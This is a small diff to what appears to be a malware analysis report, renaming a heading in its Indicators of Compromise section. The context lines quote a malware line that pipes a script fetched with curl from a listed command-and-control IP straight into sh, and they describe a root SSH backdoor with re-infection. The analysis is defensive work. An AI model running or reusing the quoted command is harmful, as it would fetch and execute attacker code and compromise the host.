@@ -168,7 +168,7 @@ I also found this code `system("curl http://45.95.147.178/z/post/root.php|sh");`
 I suspect the ultimate goal of this malware was to **open a backdoor for root access via SSH** while maintaining **continuous re-infection** mechanisms and **eliminating competing threats**, indicating use as part of a larger botnet infrastructure.
 The code is very obfuscated and complicated with a lot of base64 and bash nonsense with no purpose and repetitive code that I assume is meant to confuse malware researchers.
 
-## 3. Indicators of Compromise (IOCs)
+## Indicators of Compromise (IOCs)
 
 **C2 Infrastructure (IPv4 & URLs):**
 * 45.95.147.178
